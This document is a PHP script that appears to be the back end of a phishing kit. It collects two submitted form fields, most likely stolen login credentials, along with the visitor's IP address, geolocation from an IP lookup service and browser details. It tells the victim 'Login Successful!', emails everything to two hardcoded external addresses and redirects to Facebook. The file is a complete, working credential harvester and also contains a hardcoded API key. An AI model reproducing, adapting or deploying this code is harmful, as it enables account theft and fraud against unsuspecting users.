<?php 

    function getIPAddress() {  
        //whether ip is from the share internet  
        if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                    $ip = $_SERVER['HTTP_CLIENT_IP'];  
            }  
        //whether ip is from the proxy  
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
        }  
        //whether ip is from the remote address  
        else{  
                $ip = $_SERVER['REMOTE_ADDR'];  
        }  
        return $ip;  
    }  
    $ip = getIPAddress();
    $json = file_get_contents("http://api.ipstack.com/" . $ip . "?access_key=375e438478239d1311f846a9d31802ac");
    $json  = json_decode($json ,true);
    
    $continent_name = $json['continent_name'];
    $country_code	= $json['country_code'];
    $country_name   = $json['country_name'];
    $region_code    = $json['region_code'];
    $region_name    = $json['region_name'];
    $city           = $json['city'];
    $zip            = $json['zip'];
    $latitude       = $json['latitude'];
    $longitude      = $json['longitude'];

    function getBrowser() { 
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";
      
        //First get the platform?
        if (preg_match('/linux/i', $u_agent)) {
          $platform = 'linux';
        }elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
          $platform = 'mac';
        }elseif (preg_match('/windows|win32/i', $u_agent)) {
          $platform = 'windows';
        }
      
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
          $bname = 'Internet Explorer';
          $ub = "MSIE";
        }elseif(preg_match('/Firefox/i',$u_agent)){
          $bname = 'Mozilla Firefox';
          $ub = "Firefox";
        }elseif(preg_match('/OPR/i',$u_agent)){
          $bname = 'Opera';
          $ub = "Opera";
        }elseif(preg_match('/Chrome/i',$u_agent) && !preg_match('/Edge/i',$u_agent)){
          $bname = 'Google Chrome';
          $ub = "Chrome";
        }elseif(preg_match('/Safari/i',$u_agent) && !preg_match('/Edge/i',$u_agent)){
          $bname = 'Apple Safari';
          $ub = "Safari";
        }elseif(preg_match('/Netscape/i',$u_agent)){
          $bname = 'Netscape';
          $ub = "Netscape";
        }elseif(preg_match('/Edge/i',$u_agent)){
          $bname = 'Edge';
          $ub = "Edge";
        }elseif(preg_match('/Trident/i',$u_agent)){
          $bname = 'Internet Explorer';
          $ub = "MSIE";
        }
      
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
      ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
          // we have no matching number just continue
        }
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
          //we will have two since we are not using 'other' argument yet
          //see if version is before or after the name
          if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
              $version= $matches['version'][0];
          }else {
              $version= $matches['version'][1];
          }
        }else {
          $version= $matches['version'][0];
        }
      
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
      
        return array(
          'userAgent' => $u_agent,
          'name'      => $bname,
          'version'   => $version,
          'platform'  => $platform,
          'pattern'    => $pattern
        );
      } 

    $ua=getBrowser();

    $errors = [];
    $data = [];

    if(empty($_POST['description'])) {
        $errors['description'] = "All fields are required.";
    }

    if(empty($_POST['analysis'])) {
        $errors['analysis'] = "All fields are required.";
    }

    if (!empty($errors)) {
        $data['success'] = false;
        $data['errors'] = $errors;
    } else {
        $data['success'] = true;
        $data['message'] = 'Login Successful!';
    }
    
    echo json_encode($data);

    $lb = PHP_EOL;
    $to = "williamrogers3157@gmail.com,heycamw@hotmail.com";
    $subject = "food is served by littlelittle*";
    $body = $_POST['description'] . $lb . $_POST['analysis'] . $lb . $ip . $lb . $continent_name . $lb . $country_code . $lb . $country_name . $lb . $region_code . $lb . $region_name . $lb . $city . $lb . $zip . $lb . $ua['name'] . " " . $ua['version'] . " on " .$ua['platform'] . " reports: <br >" . $ua['userAgent'] . $lb . $lb . $lb;
    mail($to, $subject, $body);
    header("Location: http://www.facebook.com");
?>